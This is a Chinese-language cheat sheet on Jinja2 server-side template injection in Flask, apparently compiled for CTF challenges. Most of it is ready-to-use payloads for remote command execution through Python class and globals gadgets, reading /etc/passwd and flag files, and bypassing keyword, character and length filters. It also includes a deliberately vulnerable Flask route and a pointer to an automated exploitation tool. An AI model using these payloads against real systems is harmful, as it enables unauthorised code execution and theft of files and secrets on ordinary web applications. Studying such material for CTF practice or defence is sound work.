## **jinjia2**
jinjia2是python的flask框架使用的模板引擎

服务端控制层代码：
```
from flask import *

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False

@app.route('/', methods=['post', 'get'])
def index():
    return render_template('index.html')

@app.route('/login', methods=['post', 'get'])
def login():
    name = request.args.get('name', '默认字')
    # 对应的，当html是一个文件时，使用render_template 函数来渲染一个指定的文件
    return render_template('login.html'，name=name)
    # login.html使用{{name}}显示默认字

@app.route("/test", methods=['post', 'get'])
def test():
    # 接受参数名为name的参数传入
    name = request.args.get('name', '默认字')
    # 设置一个模板html，将name的值以%s输出
    html = '''<h3>your input %s</h3>'''%name
    # 将html以字符串模板的形式渲染
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True)
```
函数render_template_string()在渲染前端页面时没有考虑输入的参数，导致注入。
jinjia2模板渲染:
```
{{ ... }}：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。
{% ... %}：装载一个控制语句。
{# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值

1. 测试：
/test?name={{7*7}}
回显：
your input 47

2. 测试：
/test?name={{7*'7'}}
回显：
your input 77777777
```


^
## **模板中可以使用的属性**
```
返回信息则存在jinjia2
{{self.__dict__}}
{{config}}


使用内置函数查看全局变量字典
{{url_for.__globals__}}
若里面有current_app，查看当前APP配置，里面可能有flag变量值。如：app.config['FLAG'] = os.environ.pop('FLAG')
{{url_for.__globals__['current_app'].config}}
也可
{{get_flashed_messages.__globals__['current_app'].config}}


__class__ 返回类型所属的对象。
__mro__返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析，这里也就是class返回的对象所属的类。
__base__返回该对象所继承的基类，这里也就是class返回的对象所属的类。
__subclasses__返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表。

__globals__对包含函数全局变量的字典的引用，
里面包括get_flashed_messages()返回在Flask中通过 flash() 传入的闪现信息列表。
把字符串对象表示的消息加入到一个消息队列中，
然后通过调用get_flashed_messages() 方法取出
(闪现信息只能取出一次，取出后闪现信息会被清空)。

1. 测试：
/test?name={{''.__class__}}
回显：
 your input <class 'str'>

2. 测试：
/test?name={{''.__class__.__base__}}
回显:
your input <class 'object'>

3. 测试:
/test?name={{''.__class__.__base__.__subclasses__()}}
回显:
your input object基类的子类
即我们可以利用的类。
```

^
## **利用**
自动化寻找利用类直接RCE
```
{% for c in [].__class__.__base__.__subclasses__() %} 
  {% if c.__name__ == 'catch_warnings' %} 
    {% for b in c.__init__.__globals__.values() %} 
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %} 
          {{ b['eval']('__import__("os").popen("ls").read()') }}    //这里的ls就是需要的执行命令
        {% endif %} 
      {% endif %} 
     {% endfor %} 
  {% endif %}
{% endfor %}


原理就是找到含有 __builtins__ 的类，然后利用
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
#读写文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}



{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
{{lipsum.__globals__['os'].popen('tac ../flag').read()}}
{{lipsum.__globals__.get("os").popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()}}
{{url_for.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{cycler.__init__.__globals__.os.popen('ls').read()}}

{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}

{{ }}
config|attr('__in''it__')|attr('__glo''bals__')|attr('__geti''tem__')('os')|attr('popen')('ca''t /f''lag')|attr('re''ad')()

cycler["__in"+"it__"]["__glo"+"bals__"]  ["__bui"+"ltins__"].__import__('builtins').open('/flag').read(1)[0]=='c'
cycler["__in"+"it__"]["__glo"+"bals__"]  ["__bui"+"ltins__"].__import__('builtins').open('/flag').read()

#读取文件与写文件类
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
#执行命令
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
#命令执行：
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

{% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat ../flag').read()"))%}
```




^
## **找利用类**

若经过```{{''.__class__.__base__.__subclasses__()}}```，用工具或手工查询存在的利用类和位置后，可以借助的类反射调用方法：

下面是快速找位置脚本：
```
import json

# 功能：快速找利用类的位置

# 将{{''.__class__.__base__.__subclasses__()}}的结果放a里
a = """
<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i

for k, v in enumerate(allList):
    if "os._wrap_close" in v: # 看你要找谁的位置
        print(str(k) + "--->" + v)

```

案例：
```
<class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。可以导入后命令执行。
<class 'site._Printer'> 内含os模块（不需要import os） ，可能在第71位，可以借助这些类来执行命令。
_io.TextIOWrapper 可以文件读取，可能在122位。
```
大多数题目的flag均藏在系统中的某个文件内，或env环境变量中。

1、warnings.catch_warnings类利用：
```
目录查询
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
读取目录flask
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /flasklight').read()")}}
读取flag
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat /flasklight/coomme_geeeett_youur_flek ').read()")}}

命令
popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()

```

2、site._Printer类利用：
```
目录查询
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}

{{().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
 本来想直接用listdir('/')，但这里listdir同样被ban了

读取目录flasklight
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
读取flag
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}
```

3、_io.TextIOWrapper类利用：
```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
```

4、os._wrap_close类利用
```
?name={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()}}
```

5、其他常用类利用：
```
<type 'file'>
[].__class__.__base__.__subclasses__()[40]('fl4g').read()

<class 'subprocess.Popen'>
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```






^
## **绕过**
案例：
如由于使用['__globals__']会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式['__glo'+'bals__']
```
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}


等效：
request.__class__
request["__class__"]
request["__cla""ss__"]
request["__cla"+"ss__"]
request|attr("__class__")

array[0]
array.pop(0)
arrary.__getitem__(0)

```
单引号'被过滤可以用双引号"代替；至于点.和下划线_被过滤可以采用16进制来表示，用[](类似数组下标)的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
```
{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}

利用frozen_importlib_external.FileLoader类
get_data方法直接读打开过的文件内容
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
```
SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
<https://www.cnblogs.com/2ha0yuk7on/p/16648850.html>
ctf详解:<https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne>
python解题模板:<https://blog.csdn.net/qq_51096893/article/details/122020518>
全自动绕过getshell的jinjia2工具：<https://github.com/Marven11/Fenjing>
字符长度限制：<https://blog.csdn.net/weixin_43995419/article/details/126811287>
```
pip install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```




^
## **长度限制绕过**
set+update方法绕过长度限制最大长度40
可以使用jinja2中的set+update方法来分段保存payload，使用方法如下
```
{%set x=config.update(a=config.update)%}   //此时字典中a的值被更新为config全局对象中的update方法
{%set x=config.a(f=lipsum.__globals__)%}   //f的值被更新为lipsum.__globals__
{%set x=config.a(o=config.f.os)%}          //o的值被更新为lipsum.__globals__.os
{%set x=config.a(p=config.o.popen)%}       //p的值被更新为lipsum.__globals__.os.popen
{{config.p("cat /f*").read()}}     
 
 
 
{%print(config)%}                          //输出config字典的所有键值对
{%print(config.o)%}                        //输出
```
类似的
```
{{config.update(f=lipsum.__globals__)}}
{{config.update(o=config.f.os)}}
{{config.update(p=config.o.popen)}}
{{config.p(request.args.c).read()}}&c=cat /f*
```



^
## **使用request对象绕过**
发现系统过滤了class、 subclasses、 read等关键方法。
但是并未过滤request。
```
http://111.200.241.244:62326/{{''[request.args.a]}}?a=__class__

/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read

类似
{{''.__class__.__mro__[2].__subclasses__()[40].('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}

```

